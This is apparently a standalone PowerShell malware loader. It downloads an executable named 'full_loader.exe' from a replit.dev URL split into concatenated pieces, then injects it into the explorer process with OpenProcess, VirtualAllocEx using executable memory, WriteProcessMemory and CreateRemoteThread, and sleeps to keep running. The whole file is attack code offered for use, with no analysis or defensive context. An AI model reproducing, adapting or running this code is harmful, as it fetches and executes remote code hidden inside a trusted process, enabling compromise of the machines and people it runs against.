# Define your target process name
$targetProcess = "explorer"

# Get process ID (PID) of the target
$proc = Get-Process | Where-Object { $_.ProcessName -eq $targetProcess } | Select-Object -First 1
if ($null -eq $proc) {
    Write-Host "[-] Target process not found."
    exit
}

$pid = $proc.Id

# Download encrypted payload
$u = "https://"+"87eed37d-b1e2-4a0a-815a-657e0af9f4ec-00-yc9214lbtpvl.janeway.replit.dev/download"+"/full_loader.exe"
$w = New-Object Net.WebClient
$b64 = [Convert]::ToBase64String($w.DownloadData($u))
$by = [Convert]::FromBase64String($b64)

# Prepare Kernel32 API calls
$k = Add-Type -MemberDefinition @"
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int nSize, IntPtr lpNumberOfBytesWritten);
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
"@ -Name "Kernel32" -Namespace "x" -PassThru

# Open the target process
$processHandle = [x.Kernel32]::OpenProcess(0x1F0FFF, $false, $pid)

# Allocate memory inside the target
$addr = [x.Kernel32]::VirtualAllocEx($processHandle, [IntPtr]::Zero, $by.Length, 0x1000 -bor 0x2000, 0x40)

# Write shellcode into allocated memory
[x.Kernel32]::WriteProcessMemory($processHandle, $addr, $by, $by.Length, [IntPtr]::Zero)

# Create remote thread to execute shellcode
[x.Kernel32]::CreateRemoteThread($processHandle, [IntPtr]::Zero, 0, $addr, [IntPtr]::Zero, 0, [IntPtr]::Zero)

# Optional: sleep forever to stay alive
Start-Sleep -Seconds 86400
